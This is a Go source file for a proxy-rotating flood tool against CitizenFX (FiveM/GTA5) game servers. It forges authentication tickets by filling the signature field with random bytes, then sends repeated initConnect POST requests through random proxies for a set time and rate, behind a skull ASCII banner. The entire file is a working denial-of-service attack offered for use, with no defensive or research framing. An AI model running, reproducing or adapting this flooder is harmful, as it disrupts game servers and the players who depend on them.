package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math/big"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func generateValidTicket() string {

	lengthBuffer := make([]byte, 4)
	lengthBuffer[0] = 16

	ticketGuid := big.NewInt(148618792331476182)
	ticketGuidBuffer := make([]byte, 8)
	ticketGuid.FillBytes(ticketGuidBuffer)

	timestamp := time.Now().Unix() + int64(30+randInt(300, 86400))
	ticketExpiryBuffer := make([]byte, 8)
	timestampBytes := uint32(timestamp)
	copy(ticketExpiryBuffer[0:4], intToBytes(timestampBytes))
	copy(ticketExpiryBuffer[4:], intToBytes(uint32(timestamp>>32)))

	headerData := append(lengthBuffer, append(ticketGuidBuffer, ticketExpiryBuffer...)...)

	sigLengthBuffer := make([]byte, 4)
	sigLengthBuffer[0] = 128

	rsaSignature := make([]byte, 128)
	rand.Read(rsaSignature)

	fullData := append(headerData, append(sigLengthBuffer, rsaSignature...)...)

	encodedPayload := base64.StdEncoding.EncodeToString(fullData)

	return encodedPayload
}

func randInt(min, max int) int {
	result, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(result.Int64()) + min
}

func intToBytes(value uint32) []byte {
	buf := make([]byte, 4)
	buf[0] = byte(value)
	buf[1] = byte(value >> 8)
	buf[2] = byte(value >> 16)
	buf[3] = byte(value >> 24)
	return buf
}

func flood(host, proxy string, reqs int) {
	proxyParts := strings.Split(proxy, ":")
	conn, err := net.Dial("tcp", net.JoinHostPort(proxyParts[0], proxyParts[1]))
	if err != nil {
		fmt.Println("Error connecting to proxy:", err)
		return
	}
	defer conn.Close()

	for i := 0; i < reqs; i++ {
		ticket := url.QueryEscape(generateValidTicket())
		postData := fmt.Sprintf("cfxTicket=%s&gameBuild=2372&gameName=gta5&guid=148618792331476182&method=initConnect&name=forky&protocol=12", ticket)
		payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: CitizenFX/1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s", host, len(postData), postData)

		conn.Write([]byte(payload))
	}

	buf := bufio.NewReader(conn)
	_, err = buf.ReadBytes('\n')
	if err != nil {
		fmt.Println("Error reading response:", err)
	}
}

func printRedASCII() {
	red := "\033[31m"
	reset := "\033[0m"

	ascii := []string{
		"              iWs                                 ,W[",
		"              W@@W.                              g@@[",
		"             i@@@@@s                           g@@@@W",
		"             @@@@@@@W.                       ,W@@@@@@",
		"            ]@@@@@@@@@W.   ,_______.       ,m@@@@@@@@i",
		"           ,@@@@@@@@@@@@W@@@@@@@@@@@@@@mm_g@@@@@@@@@@[",
		"           d@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
		"          i@@@@@@@A*~~~~~VM@@@@@@@@@@Af~~~~V*@@@@@@@@@i",
		"          @@@@@A~          'M@@@@@@A`         'V@@@@@@b",
		"         d@@@*`              Y@@@@f              V@@@@@.",
		"        i@@A`                 M@@P                 V@@@b",
		"       ,@@A                   '@@                   !@@@.",
		"       W@P                     @[                    '@@W",
		"      d@@            ,         ]!                     ]@@b",
		"     g@@[          ,W@@s       ]       ,W@@s           @@@i",
		"    i@@@[          W@@@@i      ]       W@@@@i          @@@@i",
		"   i@@@@[          @@@@@[      ]       @@@@@[          @@@@@i",
		"  g@@@@@[          @@@@@!      @[      @@@@@[          @@@@@@i",
		" d@@@@@@@          !@@@P      iAW      !@@@A          ]@@@@@@@i",
		"W@@@@@@@@b          '~~      ,Z Yi      '~~          ,@@@@@@@@@",
		"'*@@@@@@@@s                  Z`  Y.                 ,W@@@@@@@@A",
		"  'M@@@*f**W.              ,Z     Vs               ,W*~~~M@@@f",
		"    'M@    'Vs.          ,z~       'N_           ,Z~     d@P",
		"   M@@@       ~\\-__  __z/` ,gmW@@mm_ '+e_.   __=/`      ,@@@@",
		"    'VMW                  g@@@@@@@@@W     ~~~          ,WAf",
		"       ~N.                @@@@@@@@@@@!                ,Z`",
		"         V.               !M@@@@@@@@f                gf-",
		"          'N.               '~***f~                ,Z`",
		"            Vc.                                  _Zf",
		"              ~e_                             ,gY~",
		"                'V=_          -@@D         ,gY~ '",
		"                    ~\\=__.           ,__z=~`",
		"                         '~~~*==Y*f~~~",
	}

	for _, line := range ascii {
		fmt.Println(red + line + reset)
	}
}

func main() {
	red := "\033[31m"
	reset := "\033[0m"

	if len(os.Args) != 6 {
		printRedASCII()
		fmt.Println(red + "\n\nUsage: go run main.go <host> <proxy_file> <time> <rate>" + reset)
		return
	}
	host := os.Args[1]
	proxyFile := os.Args[2]
	duration, _ := strconv.Atoi(os.Args[3])
	rate, _ := strconv.Atoi(os.Args[4])

	proxies, err := os.ReadFile(proxyFile)
	if err != nil {
		fmt.Println("Error reading proxy file:", err)
		return
	}
	proxyList := strings.Split(string(proxies), "\n")

	var wg sync.WaitGroup

	for i := 0; i < duration; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			proxy := proxyList[randInt(0, len(proxyList)-1)]
			flood(host, proxy, rate)
		}()
		time.Sleep(1 * time.Second)
	}

	wg.Wait()
}
